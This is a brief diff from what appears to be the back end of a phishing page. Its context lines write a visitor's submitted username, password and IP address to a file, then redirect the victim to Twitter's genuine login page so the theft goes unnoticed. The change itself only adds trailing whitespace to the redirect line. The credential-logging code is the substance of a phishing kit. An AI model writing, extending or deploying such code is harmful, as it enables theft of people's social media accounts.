@@ -9,7 +9,7 @@ $yaz="Username:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n";
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
 
-header("Location: https://twitter.com/i/flow/login");
+header("Location: https://twitter.com/i/flow/login"); 
 die();
 
  ?>
